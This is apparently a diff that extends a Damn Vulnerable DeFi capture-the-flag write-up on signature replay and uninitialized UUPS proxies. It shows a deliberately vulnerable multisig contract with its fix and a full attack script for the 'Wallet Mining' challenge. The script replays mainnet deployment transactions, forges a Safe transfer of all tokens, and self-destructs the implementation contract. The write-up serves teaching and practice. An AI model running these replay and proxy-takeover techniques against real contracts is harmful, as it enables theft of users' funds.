@@ -187,11 +187,153 @@ There are three ways in which Eve can perform the replay attack in these scenari
 
 <p align="center"><img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/d850578f-6076-4b78-99cf-c316fd032565"></p>
 
+Here is an example vulnerable contract against replay attack:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol";
+
+contract MultiSigWallet {
+    using ECDSA for bytes32;
+
+    address[2] public admins;
+
+    constructor(address[2] memory _admins) payable {
+        admins = _admins;
+    }
+
+    function deposit() external payable {}
+
+    function transfer(address _sendto, uint _amount, bytes[2] memory _sigs) external {
+        bytes32 txHash = getTxHash(_sendto, _amount);
+        require(_checkSignature(_sigs, txHash), "invalid sig");
+
+        (bool sent, ) = _sendto.call{value: _amount}("");
+        require(sent, "Failed to send Ether");
+    }
+
+    function getTxHash(address _sendto, uint _amount) public pure returns (bytes32) {
+        return keccak256(abi.encodePacked(_sendto, _amount));
+    }
+
+    function _checkSignature( bytes[2] memory _sigs, bytes32 _txHash) private view returns (bool) {
+
+        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();
+
+        for (uint i = 0; i < _sigs.length; i++) {
+            address signer = ethSignedHash.recover(_sigs[i]);
+            bool valid = signer == admins[i];
+
+            if (!valid) {
+                return false;
+            }
+        }
+
+        return true;
+    }
+}
+```
+
+As you understand from the contract, there is nothing replay attack check. It just verifies the signature of `_sendto`. Attackers can potentially exploit the contract by sending the victim's signature.
+
+
+In order to thwart potential attackers from reusing off-chain signatures, it is imperative that we introduce a mechanism to ensure the uniqueness of each signed transaction. **This can be achieved by generating a distinct transaction hash for every transaction, and one effective way to accomplish this is by incorporating a nonce into the transaction hash**.
+
+Once a transaction is successfully executed, it becomes essential to invalidate the corresponding hash to prevent any future reuse. This multi-step approach guarantees the security and integrity of our transactions by ensuring that each signature is uniquely tied to its specific transaction, deterring malicious attempts to replay previous signatures. Now, let's delve into the secure code:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.18;
+
+import "github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol";
+
+contract MultiSigWallet {
+using ECDSA for bytes32;
+
+address[2] public admins;
+mapping(bytes32 => bool) public is_executed;
+
+constructor(address[2] memory _admins) payable {
+    admins = _admins;
+}
+
+function deposit() external payable {}
+
+function transfer(address _sendto, uint _amount, uint _nonce, bytes[2] memory _sigs) external {
+    bytes32 txHash = getTxHash(_sendto, _amount, _nonce);
+
+    require(!is_executed[txHash], "transaction has been previously executed");
+
+    require(_checkSignature(_sigs, txHash), "invalid sig");
+
+    is_executed[txHash] = true;
+
+    (bool sent, ) = _sendto.call{value: _amount}("");
+    require(sent, "Failed to send Ether");
+}
+
+function getTxHash(address _sendto, uint _amount, uint _nonce) public pure returns (bytes32) {
+    return keccak256(abi.encodePacked(_sendto, _amount, _nonce));
+}
+
+function _checkSignature( bytes[2] memory _sigs, bytes32 _txHash) private view returns (bool) {
+
+    bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();
+
+    for (uint i = 0; i < _sigs.length; i++) {
+        address signer = ethSignedHash.recover(_sigs[i]);
+        bool valid = signer == admins[i];
+
+        if (!valid) {
+            return false;
+        }
+    }
+
+    return true;
+}
+    }
+```
+
+In the provided code, we've made a significant enhancement by introducing a nonce parameter to both the `getTxHash()` function and the `transfer()` function. This strategic addition has effectively ensured the uniqueness of each signature and hash generated within our system.
+
+Another thing to note is the mapping called `is_executed` which is at the top of the contract. We use this to invalidate each hash after a transaction has been carried out. To do this, we first check if is_executed is false. If it is and the signatures are valid, we set is_executed to true, then send the required ether.
+
+With the preventive measures taken, we can protect our contract from a replay attack that uses the signature of the admins.
+
+```solidity
+function transfer(address _sendto, uint _amount, uint _nonce, bytes[2] memory _sigs) external {
+    bytes32 txHash = getTxHash(_sendto, _amount, _nonce);
+
+                            // check if is_executed is still false
+    require(!is_executed[txHash], "transaction has been previously executed");
+                            // check for valid signatures
+    require(_checkSignature(_sigs, txHash), "invalid sig");
+                                    // change is_executed to true
+    is_executed[txHash] = true;
+
+                            // send ether
+    (bool sent, ) = _sendto.call{value: _amount}("");
+    require(sent, "Failed to send Ether");
+}
+```
+
+To fortify our contract against replay attacks that involve deploying the contract at an alternative address, a robust strategy entails incorporating the contract's address directly into the `getTxHash()` function. 
+
+In this manner, when administrators sign the `txHash`, they are effectively signing a hash that is intrinsically tied to the specific contract instance. This approach ensures that every signature is unique to the contract's address, making it highly resistant to replay attacks even if the contract is redeployed at a different location.
+
+```solidity
+function getTxHash(address _sendto, uint _amount, uint _nonce) public view returns (bytes32) {
+    return keccak256(abi.encodePacked(address(this), _sendto, _amount, _nonce));
+}
+```
+
 
 If you want to learn more and see example contracts, you can check [this address](https://solidity-by-example.org/hacks/signature-replay/). 
 
 
-## Signature Replay Prevention 
+## Preventing Signature Replay
 
 To safeguard against replay attacks within our contracts, it is imperative to introduce a `nonce`, such as nonce 3, to imbue each off-chain signature with uniqueness. By doing so, once a signature is employed, it becomes impossible for malicious actors to reutilize it since the contract will discern the nonce's prior usage.
 
@@ -203,12 +345,152 @@ However, in scenarios where a contract is generated through `CREATE2` and subseq
 ## Cross Chain Replay Attacks
 
 
+Cross-chain replay attacks are a type of security vulnerability that can **occur when multiple blockchain networks share a similar or identical transaction format and cryptographic signatures**. These attacks can have financial and operational consequences for users and network participants. 
+
+### Blockchain Networks and Replay Attacks
+
+Blockchain networks, like Bitcoin and Ethereum, use cryptographic signatures to verify and authorize transactions. These signatures ensure that a transaction is valid and has been authorized by the sender.
+
+### Cross-Chain Transactions
+
+Some cryptocurrencies or blockchain networks may have similar transaction structures, such as Bitcoin and Bitcoin Cash, or Ethereum and Ethereum Classic.
+Users sometimes interact with these similar networks, transferring assets or tokens between them. For instance, someone might want to move Bitcoin from the Bitcoin network to Bitcoin Cash.
+
+### 
+
+
+## Preventing Cross-Chain Replay Attacks
+
+- **Replay Protection:** Developers of new blockchain networks can include replay protection mechanisms in the protocol to prevent replay attacks. This typically involves **adding unique identifiers to transactions or changing the transaction format**.
+- **Transaction Prefixing:** Users can manually prefix their transactions with specific data or conditions that make them invalid on the other chain.
+- **Use Separate Addresses:** Maintaining separate addresses for each chain can also reduce the risk of replay attacks.
+
 
 
 
 ## Uninitialized UUPS Implementation
 
+The `Initializable` contract is a utility contract provided by the OpenZeppelin library that **helps in initializing contract state variables**. It is often used in upgradeable contracts where the state variables need to be initialized during the deployment of a new version of the contract.
+
+
+
 # Subverting
+
+To pass the challenge:
+
+- Factory account must have code
+- Master copy account must have code
+- Deposit account must have code
+- The deposit address and the Safe Deployer contract must not hold tokens
+- Player must own all tokens
+
+When we see the master copy contract in the etherscan, we find the version of this contract. Its version **v1.1.1**. [Creation tx](https://etherscan.io/tx/0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3).
+
+<p align="center"><img width="600" src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/b9f6a278-6c96-448e-a76f-16ad83044b1c"></p>
+
+We can get raw transaction hex from [etherscan](https://etherscan.io/getRawTx?tx=0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3) this creation. In this case, we can **replay safe deploy transaction with this hex**!
+
+Same process for the safe factory's creation. You can get this transaction raw hex form from [here](https://etherscan.io/getRawTx?tx=0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261). Also, get the [deployer address](https://etherscan.io/address/0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A) of this contract. All these data pass to a JSON file.
+
+
+When we analyze v1.1.1 version GnosisSafe contract, there is two helpful function for us. 
+
+```solidity
+/// @dev Allows to execute a Safe transaction confirmed by required number of owners and then pays the account that submitted the transaction.
+    ///      Note: The fees are always transfered, even if the user transaction fails.
+    /// @param to Destination address of Safe transaction.
+    /// @param value Ether value of Safe transaction.
+    /// @param data Data payload of Safe transaction.
+    /// @param operation Operation type of Safe transaction.
+    /// @param safeTxGas Gas that should be used for the Safe transaction.
+    /// @param baseGas Gas costs for that are indipendent of the transaction execution(e.g. base transaction fee, signature check, payment of the refund)
+    /// @param gasPrice Gas price that should be used for the payment calculation.
+    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.
+    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).
+    /// @param signatures Packed signature data ({bytes32 r}{bytes32 s}{uint8 v})
+    function execTransaction(
+        address to,
+        uint256 value,
+        bytes calldata data,
+        Enum.Operation operation,
+        uint256 safeTxGas,
+        uint256 baseGas,
+        uint256 gasPrice,
+        address gasToken,
+        address payable refundReceiver,
+        bytes calldata signatures
+    )
+        external
+        returns (bool success)
+    {
+        bytes32 txHash;
+        // Use scope here to limit variable lifetime and prevent `stack too deep` errors
+        {
+            bytes memory txHashData = encodeTransactionData(
+                to, value, data, operation, // Transaction info
+                safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, // Payment info
+                nonce
+            );
+            // Increase nonce and execute transaction.
+            nonce++;
+            txHash = keccak256(txHashData);
+            checkSignatures(txHash, txHashData, signatures, true);
+        }
+        require(gasleft() >= safeTxGas, "Not enough gas to execute safe transaction");
+        // Use scope here to limit variable lifetime and prevent `stack too deep` errors
+        {
+            uint256 gasUsed = gasleft();
+            // If no safeTxGas has been set and the gasPrice is 0 we assume that all available gas can be used
+            success = execute(to, value, data, operation, safeTxGas == 0 && gasPrice == 0 ? gasleft() : safeTxGas);
+            gasUsed = gasUsed.sub(gasleft());
+            // We transfer the calculated tx costs to the tx.origin to avoid sending it to intermediate contracts that have made calls
+            uint256 payment = 0;
+            if (gasPrice > 0) {
+                payment = handlePayment(gasUsed, baseGas, gasPrice, gasToken, refundReceiver);
+            }
+            if (success) emit ExecutionSuccess(txHash, payment);
+            else emit ExecutionFailure(txHash, payment);
+        }
+    }
+```
+
+With `execTransaction()`, we can **execute the code which transfers all tokens to our address**.
+
+```solidity
+/// @dev Returns hash to be signed by owners.
+    /// @param to Destination address.
+    /// @param value Ether value.
+    /// @param data Data payload.
+    /// @param operation Operation type.
+    /// @param safeTxGas Fas that should be used for the safe transaction.
+    /// @param baseGas Gas costs for data used to trigger the safe transaction.
+    /// @param gasPrice Maximum gas price that should be used for this transaction.
+    /// @param gasToken Token address (or 0 if ETH) that is used for the payment.
+    /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin).
+    /// @param _nonce Transaction nonce.
+    /// @return Transaction hash.
+    function getTransactionHash(
+        address to,
+        uint256 value,
+        bytes memory data,
+        Enum.Operation operation,
+        uint256 safeTxGas,
+        uint256 baseGas,
+        uint256 gasPrice,
+        address gasToken,
+        address refundReceiver,
+        uint256 _nonce
+    )
+        public
+        view
+        returns (bytes32)
+    {
+        return keccak256(encodeTransactionData(to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, _nonce));
+    }
+```
+
+We can use the `getTransactionHash()` function to get transaction hash from we will generated the contract. Let's move on to attack contract:
+
 
 ```solidity
 pragma solidity ^0.8.0;
@@ -240,8 +522,157 @@ contract AttackWalletMining{
 }
 ```
 
-```js
+We have `proxiableUUID()` function returns implementaion slot `IERC1822ProxiableUpgradeable(newImplementation).proxiableUUID()` request from the `_upgradeToAndCallUUPS()`.
 
+```solidity
+function _upgradeToAndCallUUPS(
+        address newImplementation,
+        bytes memory data,
+        bool forceCall
+    ) internal {
+        // Upgrades from old implementations will perform a rollback test. This test requires the new
+        // implementation to upgrade back to the old, non-ERC1822 compliant, implementation. Removing
+        // this special case will break upgrade paths from old UUPS implementation to new ones.
+        if (StorageSlotUpgradeable.getBooleanSlot(_ROLLBACK_SLOT).value) {
+            _setImplementation(newImplementation);
+        } else {
+            try IERC1822ProxiableUpgradeable(newImplementation).proxiableUUID() returns (bytes32 slot) {
+                require(slot == _IMPLEMENTATION_SLOT, "ERC1967Upgrade: unsupported proxiableUUID");
+            } catch {
+                revert("ERC1967Upgrade: new implementation is not UUPS");
+            }
+            _upgradeToAndCall(newImplementation, data, forceCall);
+        }
+    }
+```
+
+Here are the attacker commands:
+
+```js
+const data = require("./data.json");
+const attackWalletDeployer = walletDeployer.connect(player);
+const attackAuthorizer = authorizer.connect(player);
+
+// Transfer funds to deploying address
+const tx = {
+    to: data.REPLAY_DEPLOY_ADDRESS,
+    value: ethers.utils.parseEther("1")
+}
+await player.sendTransaction(tx);
+
+// Replay safe deploy transaction with same data from mainnet
+// Tx -> 0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3
+//  Nonce 0
+const deploySafeTx = await (await ethers.provider.sendTransaction(data.DEPLOY_SAFE_TX)).wait();
+const safeContractAddr = deploySafeTx.contractAddress;
+
+// Do same thing again with nonce 1
+const randomTx = await (await ethers.provider.sendTransaction(data.RANDOM_TX)).wait();
+
+// Replay factory deploy transaction with same data from mainnet
+// Tx -> 0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261
+// Nonce 2
+const deployFactoryTx = await (await ethers.provider.sendTransaction(data.DEPLOY_FACTORY_TX)).wait();
+const factoryContractAddr = deployFactoryTx.contractAddress;
+const proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", factoryContractAddr, player);
+
+// Helper function to create ABIs
+const createInterface = (signature, methodName, arguments) => {
+    const ABI = signature;
+    const IFace = new ethers.utils.Interface(ABI);
+    const ABIData = IFace.encodeFunctionData(methodName, arguments);
+    return ABIData;
+}
+
+const safeABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",
+"function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)",
+"function getTransactionHash( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)"];
+const setupDummyABIData = createInterface(safeABI, "setup",  [
+    [player.address],
+    1,
+    ethers.constants.AddressZero,
+    0,
+    ethers.constants.AddressZero,
+    ethers.constants.AddressZero,
+    0,
+    ethers.constants.AddressZero,
+])
+
+// Find how many addresses required to find the missing address of
+// 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
+let nonceRequired = 0
+let address = ""
+while (address.toLowerCase() != DEPOSIT_ADDRESS.toLowerCase()) {
+    address = ethers.utils.getContractAddress({
+from: factoryContractAddr,
+nonce: nonceRequired
+    });
+    nonceRequired += 1;
+}
+
+for (let i = 0; i < nonceRequired ; i ++) {
+    await proxyFactory.createProxy(safeContractAddr, setupDummyABIData);
+}
+
+// Create transfer interface for execTransaction
+const tokenABI = ["function transfer(address to, uint256 amount)"];
+const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);
+
+// Create an execTransaction that transfers all tokens back to the player
+
+// 1. need to get transaction hash from here https://github.com/safe-global/safe-contracts/blob/v1.1.1/contracts/GnosisSafe.sol#L398
+// 2. sign transaction hash
+// 3. Add 4 to v as per gnosis spec to show it is an eth_sign tx https://docs.gnosis-safe.io/learn/safe-tools/signatures
+// 3. Send it through exec transaction
+
+const depositAddrSafe = await ethers.getContractAt("GnosisSafe", DEPOSIT_ADDRESS, player);
+
+// Test that we are connected
+// Params for the execTransaction
+const transactionParams = [
+    token.address,
+    0,
+    tokenABIData,
+    0,
+    0,
+    0,
+    0,
+    ethers.constants.AddressZero,
+    ethers.constants.AddressZero,
+    0
+];
+
+// Get tx hash from generated from the contract
+const txhash = await depositAddrSafe.getTransactionHash(...transactionParams);
+const signed = await player.signMessage(ethers.utils.arrayify(txhash));
+
+// Increase v by 4
+const signedIncreaseV = ethers.BigNumber.from(signed).add(4).toHexString();
+
+// Remove nonce from params and pass in params as well as signed hash
+await depositAddrSafe.execTransaction(...(transactionParams.slice(0, -1)), signedIncreaseV);
+
+
+// Get the implementation address and initialise it
+const impSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
+let implementationAddress = "0x" + (await ethers.provider.getStorageAt(attackAuthorizer.address, impSlot)).slice(-40);
+const impContract = await ethers.getContractAt("AuthorizerUpgradeable", implementationAddress, player);
+const attackContractFactory = await ethers.getContractFactory("AttackWalletMining", player);
+const attackContract = await attackContractFactory.deploy();
+const attackABI = ["function attack()"];
+const IAttack = createInterface(attackABI, "attack", []);
+
+// Init implementation contract to claim ownership of the contract
+// Upgrade to and call attacking contract, calling selfdestruct
+await impContract.init([], []);
+await impContract.upgradeToAndCall(attackContract.address, IAttack);
+
+// Deploy 43 Wallets through wallet deployer to retrieve all tokens in the contract
+for (let i = 0; i < 43; i ++) {
+    await (await attackWalletDeployer.drop(setupDummyABIData)).wait();
+}
+
+await printPlayerTokenBalance()
 ```
 
 Solve the challenge.
